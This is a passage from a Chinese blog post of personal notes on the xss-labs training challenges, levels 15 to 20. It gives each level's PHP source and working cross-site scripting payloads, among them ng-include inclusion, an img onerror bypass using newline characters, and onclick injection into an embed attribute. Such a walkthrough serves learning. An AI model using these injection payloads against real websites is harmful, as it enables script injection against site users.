class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>只发现可src一个传入点，给ai看了一下，好像要有中间件绕过？  </p>
<p>上网看wp：  </p>
<p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号  </p>
<p>竟然能直接包含第一关？  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload<br></code></pre></td></tr></table></figure>

<p>所以就是攻击包含的代码来达到攻击的效果吗？  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;fff&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>通关<br>源wp是下面的payload：  </p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;</span><br><span class="language-xml">```  </span><br><span class="language-xml"></span><br><span class="language-xml">## level 16  </span><br><span class="language-xml"></span><br><span class="language-xml">依旧偷看源码：  </span><br><span class="language-xml">```php</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span></span><br><span class="language-javascript"><span class="language-xml">&#123;     </span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);</span><br><span class="language-php"><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);</span><br><span class="language-php"><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);</span><br><span class="language-php"><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;	&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>这都过滤了啥？  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">script</span><br>空格<br>/  (可以用来代替空格)<br></code></pre></td></tr></table></figure>

<p>php的空格绕过是经典必考了，上网一查就有，<br>payload：  </p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;fff&quot;</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure>

<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>开题就显示插件不支持。。。。<br>前端html：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>还是看看源码吧：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level17&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>依旧看(wp)[<a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]">https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]</a>  </p>
<p>大概是考了embad区域?   </p>
<p>选择了改一下源码。。。<br>变成了：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=indce.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>尝试了：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=onclick&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure>
<p>不行，注意到写法里的引号<br>然而正确的payload为：  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure>
<p>少了个空格也不行  </p>
<p>当为arg01时：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>= <span class="hljs-string">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>当为 ?arg01&#x3D;onclick&amp;arg02&#x3D;alert(1) 时：  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?onclick</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>所以说只有当 ?arg02&#x3D; onclick&#x3D;alert() 才能构成：   </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span>= <span class="hljs-string">onclick</span>=<span class="hljs-string">alert()</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>这时的 onclick&#x3D;alert() 才是生效的  </p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>也是和上题一样改了一下源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level18&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=index.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>没看出来有啥区别，同一个payload过了：  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure>

<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level20.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level19&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;embed src=&quot;index.png?&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>需要绕过引号  </p>
<p>看了网上wp，需要用flash的漏洞，现在网站很多都不用flash了  </p>
<h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>还是考flash。。。  </p>
<p>算了，放过我自己吧，，，   </p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/sql-labs/" class="print-no-link">#sql-labs</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>note-01</div>
      <div>https://aidemofashi.github.io/2025/02/26/notepad/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>aidemofashi</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年2月26日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/02/26/note-01/" title="note-01">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">note-01</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/02/25/web%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/" title="web学习计划">
                        <span class="hidden-mobile">web学习计划</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
